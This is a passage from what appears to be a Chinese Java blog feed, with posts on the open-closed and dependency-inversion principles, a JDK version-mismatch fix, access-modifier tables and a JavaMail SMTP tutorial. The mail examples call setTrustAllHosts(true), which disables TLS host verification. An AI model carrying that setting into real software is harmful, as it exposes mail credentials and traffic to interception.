<p><strong>优点：不用修改原来的代码</strong></p>
<p><strong>优点：不用修改原来的代码</strong></p>
<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><p><strong>关键就是对对象进行抽象</strong>。如果几个实体共属于同一个类别，我们就可以把这个<strong>共同类</strong>别<strong>抽象出来</strong>。然后实体分别来<strong>implements</strong>这个抽象类。每当多出一个该抽象类的具体实体类的时候，我们只要再写一个类来继续implements这个抽象类即可。</p>
<p>在这个过程中，我们就是遵循了开闭原则。</p>
<h3 id="通过案例来理解"><a href="#通过案例来理解" class="headerlink" title="通过案例来理解"></a>通过案例来理解</h3><p>本案例以实体类为例讲解（对于功能模块也是一样的道理）</p>
<blockquote>
<p>时间段①：有一个人，叫张三，想要调查一个事情，就是现在婴儿吃饭是怎么吃的，我们就用<strong>Test</strong>类来代表张三这个个体（相当于客户端）。然后一个类叫<strong>Query</strong>的类，它可以帮助查询这个问题的答案。</p>
</blockquote>
<p>常规做法：</p>
<p><img src="https://i.loli.net/2021/10/21/LtU9TNHslBMuJ3v.png" alt="image-20211021014254617"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Query query = <span class="keyword">new</span> Query();</span><br><span class="line">        Baby baby = <span class="keyword">new</span> Baby();</span><br><span class="line">        query.query(baby);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;		<span class="comment">//调查工具</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">(Baby baby)</span> </span>&#123;</span><br><span class="line">        baby.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> </span>&#123;		<span class="comment">//婴儿</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;婴儿吃饭要人喂&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>似乎没毛病，一点问题都没嘚</strong></p>
<p>但是，如果过了一万年（也就是你已经<strong>忘记了</strong>当时你的Query类中逻辑的时候），你遇到了新的需求：</p>
<blockquote>
<p>时间段②：张三又想调查一下大学生是怎么吃饭的，张三就对这个程序进行了修改。</p>
</blockquote>
<p><img src="https://i.loli.net/2021/10/21/E7YGyFRmBbj1wN6.png" alt="image-20211021014151368"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Query query = <span class="keyword">new</span> Query();</span><br><span class="line">        </span><br><span class="line">        Baby baby = <span class="keyword">new</span> Baby();</span><br><span class="line">        query.query(baby);</span><br><span class="line">        </span><br><span class="line">        CollageStudent collageStudent = <span class="keyword">new</span> CollageStudent();</span><br><span class="line">        query.queryCollageStudent(collageStudent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">(Baby baby)</span> </span>&#123;</span><br><span class="line">        baby.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//由于多了一个目标人群，所以修改了查询工具的源代码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">queryCollageStudent</span><span class="params">(CollageStudent collageStudent)</span> </span>&#123;</span><br><span class="line">        collageStudent.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;婴儿吃饭要人喂&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CollageStudent</span> </span>&#123;			<span class="comment">//多了一个目标人群，大学生类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大学生是自己喂自己吃饭的&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面的过程中，貌似只要多一个查询的目标，就要多写一个方法，进行查询，似乎没什么问题。。。。。</p>
<p>但是，如果，碰到一下几种情况呢？</p>
<ul>
<li>如果新出现的类中，有些依赖和原来的程序中的一些依赖冲突了呢？</li>
<li>如果不是加一个方法，而是在一个方法中，进行添加一些查询条件，导致逻辑上的分析变得异常艰难呢？</li>
</ul>
<p>此时，不难发现，已经出现了一些上面提到的问题和风险了</p>
<blockquote>
<p>时间段③：张三后来又查了五六个目标人群后，也意识到了这个问题，于是就去找好朋友了，好朋友大葱鸣出面了！直接一句：“看我的！”。接着大葱鸣就给张三讲解了设计模式的开闭原则。张三顿悟！心中刹那有一妙计！</p>
</blockquote>
<h3 id="妙计为何？（解决方案）"><a href="#妙计为何？（解决方案）" class="headerlink" title="妙计为何？（解决方案）"></a>妙计为何？（解决方案）</h3><p><img src="https://i.loli.net/2021/10/21/nxuI1goWNzrDG2V.png" alt="image-20211021020001227"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Query query = <span class="keyword">new</span> Query();</span><br><span class="line">        Baby baby = <span class="keyword">new</span> Baby();</span><br><span class="line">        query.query(baby);</span><br><span class="line">        CollageStudent collageStudent = <span class="keyword">new</span> CollageStudent();</span><br><span class="line">        query.query(collageStudent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">(Person person)</span> </span>&#123;		<span class="comment">//自始至终，这个Query可以永远用下去，不需要发生修改</span></span><br><span class="line">        person.eat();	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span></span>&#123;							<span class="comment">//抽象出一个抽象类，可以定义为抽象类，也可以定义为接口</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> <span class="keyword">implements</span> <span class="title">Person</span></span>&#123;				<span class="comment">//继承Person类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;婴儿吃饭要人喂&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CollageStudent</span> <span class="keyword">implements</span> <span class="title">Person</span></span>&#123;		<span class="comment">//继承Person类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大学生是自己喂自己吃饭的&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>如果是功能模块，也和实体类类似，尽量抽象出抽象类，遵从开闭原则，允许扩展，规避修改</p>
<p>目的就是一个，<strong>减少因后加的需求导致的修改原来代码的操作</strong></p>
<h2 id="依赖倒置原则（DIP）"><a href="#依赖倒置原则（DIP）" class="headerlink" title="依赖倒置原则（DIP）"></a>依赖倒置原则（DIP）</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>高层模块不依赖于底层，底层模块依赖于高层</p>
<p>抽象不应该依赖于细节，细节依赖于抽象</p>
<p>换言之：<strong>要针对接口编程，而不是针对实现编程</strong></p>
<h3 id="依赖倒置原则和开闭原则关系"><a href="#依赖倒置原则和开闭原则关系" class="headerlink" title="依赖倒置原则和开闭原则关系"></a>依赖倒置原则和开闭原则关系</h3><p>如果说，开闭原则是面向对象设计的目标，那么依赖倒置原则就是其实现机制</p>
<h3 id="要求做法"><a href="#要求做法" class="headerlink" title="要求做法"></a>要求做法</h3><p><strong>在程序中传递参数时，或者在关联关系中，尽量引用高层次的抽象层类，即使用接口和抽象类进行变量类型声明、方法返回类型声明，以及数据类型的转换等，而不是用具体类来做这些事情。</strong></p>
<p><strong>一个具体类仅实现接口或抽象类中定义的方法，不额外给出多余的方法，否则将无法调用到子类中增加的方法</strong></p>
<h3 id="依赖注入三种方式"><a href="#依赖注入三种方式" class="headerlink" title="依赖注入三种方式"></a>依赖注入三种方式</h3><p>在实现依赖倒置原则时，需要<strong>针对抽象层编程</strong>，将具体的对象通过<strong>依赖注入</strong>的方式注入到其他对象中</p>
<ol>
<li><strong>构造注入：</strong>通过构造函数传入抽象类指代的具体类的对象</li>
<li><strong>setter（设值）注入：</strong>通过setter方法传入抽象类指代的具体类的对象</li>
<li><strong>接口注入：</strong>通过在接口中声明的业务方法来传入抽象类指代的具体的对象</li>
</ol>
<p>举例：构造注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Baby baby = <span class="keyword">new</span> Baby();</span><br><span class="line">        Query query = <span class="keyword">new</span> Query(baby);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    Person person = <span class="keyword">null</span>;</span><br><span class="line">    Query(Person person) &#123;				<span class="comment">//通过 构造方法注入 父类Person指代的子类Baby类对象</span></span><br><span class="line">        <span class="keyword">this</span>.person = person;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> <span class="keyword">implements</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;婴儿吃饭要人喂&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注：这些方法在定义的时候使用的都是抽象类型，在运行时，才传入具体类型的对象，由子类覆盖父类</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>开闭原则可以说是面向对象程序设计的目的（降低风险，减少程序修改的需要），而依赖倒置原则就可以说是实现这个目标的手段</p>
]]></content>
      <tags>
        <tag>设计模式6大原则</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机执行所生成的jar文件报错：版本不支持</title>
    <url>/2021/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%89%80%E7%94%9F%E6%88%90%E7%9A%84jar%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99%E2%80%94%E2%80%94%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/</url>
    <content><![CDATA[<h2 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h2><span id="more"></span>

<ul>
<li>在IDE编辑器中也会出现和本文中讨论的问题一样的错误，两种情况的原因是一样的，其解决方法可以参考我的另一篇文章：<a href="https://liu-ruyang.github.io/2021/05/29/MyEclipse%E2%80%94%E2%80%94jdk%E7%89%88%E6%9C%AC%E4%B8%8D%E6%94%AF%E6%8C%81/">MyEclipse——jdk版本不支持</a></li>
</ul>
<h2 id="报错信息："><a href="#报错信息：" class="headerlink" title="报错信息："></a>报错信息：</h2><pre><code>Error: A JNI error has occurred, please check your
installation and try again
Exception in thread &quot;main&quot; java.lang.UnsupportedClassVersionError: Option has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(Unknown Source)
    at java.security.SecureClassLoader.defineClass(Unknown Source)
    at java.net.URLClassLoader.defineClass(Unknown Source)
    at java.net.URLClassLoader.access$100(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at sun.launcher.LauncherHelper.checkAndLoadMain(Unknown Source)
</code></pre>
<h3 id="具体报错（来波图更清楚）"><a href="#具体报错（来波图更清楚）" class="headerlink" title="具体报错（来波图更清楚）"></a>具体报错（来波图更清楚）</h3><ol>
<li>下面是我在idea中写java项目的时候所使用的jdk版本：jdk11<br><img src="https://i.loli.net/2021/06/11/4kM98ENw1rX3Ai7.png" alt="屏幕截图 2021-06-11 221943.png"></li>
<li>以下是我生成的jar文件所存放的地址<br><img src="https://i.loli.net/2021/06/11/JLrIlSF9aWjz3Bw.png" alt="屏幕截图 2021-06-11 220448.png"></li>
<li>项目在idea中的正常执行效果如下图<br><img src="https://i.loli.net/2021/06/11/5ydtn129GNIJVRE.png" alt="屏幕截图 2021-06-11 223921.png"></li>
<li> 可是，然后我在cmd中执行这个jar文件，开始报错，如下图<br><img src="https://i.loli.net/2021/06/11/nSP6EuXJTVUo5fO.png" alt="屏幕截图 2021-06-11 220834.png"><h2 id="原因解释："><a href="#原因解释：" class="headerlink" title="原因解释："></a>原因解释：</h2></li>
</ol>
<p><strong>简而言之：这是因为计算机上java的编译版本和java的运行版本不一致的原因</strong></p>
<ul>
<li><strong>尽管你是在环境变量中已经修改了jdk的配置如下图（我习惯是用的jdk11，所以以jdk11为例，其他版本也是一样的道理，操作过程一样）：</strong><br><img src="https://i.loli.net/2021/06/11/4DalxifhVoFLu2Y.png" alt="屏幕截图 2021-06-11 224304.png"></li>
<li><strong>但是仍然会发现，jar文件还会报上面的错误</strong><br><img src="https://i.loli.net/2021/06/11/nSP6EuXJTVUo5fO.png" alt="屏幕截图 2021-06-11 220834.png"><h3 id="原因验证步骤"><a href="#原因验证步骤" class="headerlink" title="原因验证步骤"></a>原因验证步骤</h3></li>
</ul>
<ol>
<li>查看编译版本：在cmd中输入以下命令，可以发现此时的java的运行版本是jdk11的 <code>java -version</code></li>
</ol>
<p><img src="https://i.loli.net/2021/06/11/aHPtkx7rbldA942.png" alt="屏幕截图 2021-06-11 221513.png"></p>
<ol start="2">
<li><p>查看java运行版本：在cmd中输入以下命令，可以发现此时的java的编译版本是jdk1.8</p>
<p> <code>javac -version</code></p>
</li>
</ol>
<p><img src="https://i.loli.net/2021/06/11/vG8HKV3Pc6TeF15.png" alt="屏幕截图 2021-06-11 221647.png"></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ul>
<li>之所以会出现以上的编译版本和运行版本不一样，原因在于最先安装IDE编译器的时候，可能自动帮你写了一个环境变量，如下图：<br><img src="https://i.loli.net/2021/06/11/wYStXrCxE4nig61.png" alt="屏幕截图 2021-06-11 222847.png"></li>
<li>这个路径下的有三个文件，见下图：<br><img src="https://i.loli.net/2021/06/11/xpgGWo1crdu8YnV.png" alt="屏幕截图 2021-06-11 224651.png"></li>
<li>在安装了jdk11后，并且将其添加到了环境变量中的路径中后，应当<strong>将上图中的三个文件都删除掉</strong></li>
</ul>
<h3 id="效果如图"><a href="#效果如图" class="headerlink" title="效果如图"></a>效果如图</h3><p>会发现此时的编译版本和运行版本都变成了jdk11了<br><img src="https://i.loli.net/2021/06/11/SewUKAoyj2qgRrY.png" alt="屏幕截图 2021-06-11 223533.png"><br>此时再运行一下之前生成的jar文件，就执行成功啦，嘿嘿！<br><img src="https://i.loli.net/2021/06/11/8mYHXxQC3ubLgzv.png" alt="屏幕截图 2021-06-11 223635.png"></p>
<p>到这就成功啦！！</p>
<p>喝彩！！ </p>
]]></content>
      <tags>
        <tag>jdk版本不支持</tag>
      </tags>
  </entry>
  <entry>
    <title>访问权限修饰符</title>
    <url>/2021/12/19/%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<h2 id="Java中的访问权限"><a href="#Java中的访问权限" class="headerlink" title="Java中的访问权限"></a>Java中的访问权限</h2><span id="more"></span>

<table>
<thead>
<tr>
<th align="left">访问权限</th>
<th>本类</th>
<th>本包的类</th>
<th>子类</th>
<th>非子类的外包类</th>
</tr>
</thead>
<tbody><tr>
<td align="left">public</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td align="left">protected</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td align="left">default</td>
<td>是</td>
<td>是</td>
<td>否</td>
<td>否</td>
</tr>
<tr>
<td align="left">private</td>
<td>是</td>
<td>否</td>
<td>否</td>
<td>否</td>
</tr>
</tbody></table>
<h2 id="C-中派生类对基类的访问权限"><a href="#C-中派生类对基类的访问权限" class="headerlink" title="C++中派生类对基类的访问权限"></a>C++中派生类对基类的访问权限</h2><table>
<thead>
<tr>
<th>基类修饰符\继承方式</th>
<th>public</th>
<th>protected</th>
<th>private</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>public</td>
<td>protected</td>
<td>private</td>
</tr>
<tr>
<td>protected</td>
<td>protected</td>
<td>protected</td>
<td>private</td>
</tr>
<tr>
<td>private</td>
<td>NO（即不可直接访问）</td>
<td>NO（即不可直接访问）</td>
<td>NO（即不可直接访问）</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>java访问权限修饰符</tag>
        <tag>C++访问权限修饰符</tag>
      </tags>
  </entry>
  <entry>
    <title>Java实现邮件推送+实战</title>
    <url>/2021/10/19/Java%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E6%8E%A8%E9%80%81-%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h2 id="jar包的支持"><a href="#jar包的支持" class="headerlink" title="jar包的支持"></a>jar包的支持</h2><span id="more"></span>

<p><strong>核心功能jar包</strong></p>
<p><strong>activation-1.1.1.jar</strong></p>
<p><strong>mail-1.4.7.jar</strong></p>
<p><img src="https://i.loli.net/2021/10/19/AwFy9BfaUYVmLZs.png" alt="image-20211019231658961"></p>
<h2 id="邮件发送原理图"><a href="#邮件发送原理图" class="headerlink" title="邮件发送原理图"></a>邮件发送原理图</h2><p><img src="https://i.loli.net/2021/10/19/CApQoXxJ2Hzeb71.png" alt="邮件发送原理图"></p>
<h2 id="授权码的获取"><a href="#授权码的获取" class="headerlink" title="授权码的获取"></a>授权码的获取</h2><p><img src="https://i.loli.net/2021/10/19/Om9LTPkjKNd5R8S.png" alt="image-20211019231823437"></p>
<h2 id="简易文本邮件发送的实现（只有文本、一般是超文本类型）"><a href="#简易文本邮件发送的实现（只有文本、一般是超文本类型）" class="headerlink" title="简易文本邮件发送的实现（只有文本、一般是超文本类型）"></a>简易文本邮件发送的实现（只有文本、一般是超文本类型）</h2><p><img src="https://i.loli.net/2021/10/19/1Sq5fBUYTQ6g3dH.png" alt="简易文本邮件发送的实现"></p>
<p><strong>由上图我们可以确定几个必须步骤</strong></p>
<p><strong>1.创建session对象</strong></p>
<p><strong>2.创建Transport对象</strong></p>
<p><strong>3.使用邮箱的用户名和授权码连上邮件服务器</strong></p>
<p><strong>4.创建一个Message对象（需要传递session）</strong></p>
<ul>
<li><strong>message需要指明发件人、收件人以及文件内容</strong></li>
</ul>
<p><strong>5.发送邮件</strong></p>
<p><strong>6.关闭连接</strong></p>
<h3 id="仅包含文本的发送"><a href="#仅包含文本的发送" class="headerlink" title="仅包含文本的发送"></a>仅包含文本的发送</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.mail.util.MailSSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.mail.*;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.InternetAddress;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMessage;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailDemo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties prop=<span class="keyword">new</span> Properties();</span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.host&quot;</span>,<span class="string">&quot;smtp.qq.com&quot;</span>);<span class="comment">///设置QQ邮件服务器</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.transport.protocol&quot;</span>,<span class="string">&quot;smtp&quot;</span>);<span class="comment">///邮件发送协议</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.smtp.auth&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//需要验证用户密码</span></span><br><span class="line">        <span class="comment">//QQ邮箱需要设置SSL加密</span></span><br><span class="line">        MailSSLSocketFactory sf=<span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">        sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.socketFactory&quot;</span>,sf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用javaMail发送邮件的5个步骤</span></span><br><span class="line">        <span class="comment">//1.创建定义整个应用程序所需要的环境信息的session对象</span></span><br><span class="line">        Session session=Session.getDefaultInstance(prop, <span class="keyword">new</span> Authenticator() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> PasswordAuthentication <span class="title">getPasswordAuthentication</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> PasswordAuthentication(<span class="string">&quot;XXXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//开启session的debug模式，这样可以查看到程序发送Email的运行状态</span></span><br><span class="line">        session.setDebug(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//2.通过session得到transport对象</span></span><br><span class="line">        Transport ts=session.getTransport();</span><br><span class="line">        <span class="comment">//3.使用邮箱的用户名和授权码连上邮件服务器</span></span><br><span class="line">        ts.connect(<span class="string">&quot;smtp.qq.com&quot;</span>,<span class="string">&quot;XXXX@qq.com&quot;</span>,<span class="string">&quot;授权码&quot;</span>);</span><br><span class="line">        <span class="comment">//4.创建邮件：写文件</span></span><br><span class="line">        <span class="comment">//注意需要传递session</span></span><br><span class="line">        MimeMessage message=<span class="keyword">new</span> MimeMessage(session);</span><br><span class="line">        <span class="comment">//指明邮件的发件人</span></span><br><span class="line">        message.setFrom(<span class="keyword">new</span> InternetAddress(<span class="string">&quot;XXXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//指明邮件的收件人</span></span><br><span class="line">        message.setRecipient(Message.RecipientType.TO,<span class="keyword">new</span> InternetAddress(<span class="string">&quot;XXXX@qq.com&quot;</span>));</span><br><span class="line">        <span class="comment">//邮件标题</span></span><br><span class="line">        message.setSubject(<span class="string">&quot;发送的标题&quot;</span>);</span><br><span class="line">        <span class="comment">//邮件的文本内容</span></span><br><span class="line">        message.setContent(<span class="string">&quot;内容&quot;</span>,<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">//5.发送邮件</span></span><br><span class="line">        ts.sendMessage(message,message.getAllRecipients());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.关闭连接</span></span><br><span class="line">        ts.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="必要配置信息："><a href="#必要配置信息：" class="headerlink" title="必要配置信息："></a>必要配置信息：</h3><p><img src="https://i.loli.net/2021/10/19/DIrkmMuqwTV72jJ.png" alt="image-20211019233456201"></p>
<h3 id="注意：QQ等大厂的邮箱需要有几点注意："><a href="#注意：QQ等大厂的邮箱需要有几点注意：" class="headerlink" title="注意：QQ等大厂的邮箱需要有几点注意："></a><strong>注意：QQ等大厂的邮箱需要有几点注意：</strong></h3><p><img src="https://i.loli.net/2021/10/19/4W9GitOfwPIlkmu.png" alt="image-20211019232913596"></p>
<h2 id="复杂文件内容的发送（含有图片、附件等）"><a href="#复杂文件内容的发送（含有图片、附件等）" class="headerlink" title="复杂文件内容的发送（含有图片、附件等）"></a>复杂文件内容的发送（含有图片、附件等）</h2><h3 id="文件构成解析"><a href="#文件构成解析" class="headerlink" title="文件构成解析"></a>文件构成解析</h3><p><img src="https://i.loli.net/2021/10/19/AFfkxdaLigJybB7.png" alt="文件构成解析"></p>
<p>除了邮件内容部分，其他的部分代码往往是相同的，除了需要根据不同的邮箱运营商编写不同的配置代码外。邮件内容也被分为很多个部分，由文件、图片、附件等构成，编写邮件内容的过程，类似于积木的拼接，另外值得注意的是文本内容一般为HTML的格式发送。</p>
<p><strong><u>每一个文本、图片、附件可以分为一个MimeBodyPart，由MimeMultipart完成组装</u></strong></p>
<h3 id="包含图片的发送"><a href="#包含图片的发送" class="headerlink" title="包含图片的发送"></a>包含图片的发送</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.mail.util.MailSSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.DataHandler;</span><br><span class="line"><span class="keyword">import</span> javax.activation.FileDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.mail.*;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.InternetAddress;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeBodyPart;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMessage;</span><br><span class="line"><span class="keyword">import</span> javax.mail.internet.MimeMultipart;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MailDemo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties prop=<span class="keyword">new</span> Properties();</span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.host&quot;</span>,<span class="string">&quot;smtp.qq.com&quot;</span>);<span class="comment">///设置QQ邮件服务器</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.transport.protocol&quot;</span>,<span class="string">&quot;smtp&quot;</span>);<span class="comment">///邮件发送协议</span></span><br><span class="line">        prop.setProperty(<span class="string">&quot;mail.smtp.auth&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//需要验证用户密码</span></span><br><span class="line">        <span class="comment">//QQ邮箱需要设置SSL加密</span></span><br><span class="line">        MailSSLSocketFactory sf=<span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">        sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line">        prop.put(<span class="string">&quot;mail.smtp.ssl.enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        prop.put(<span 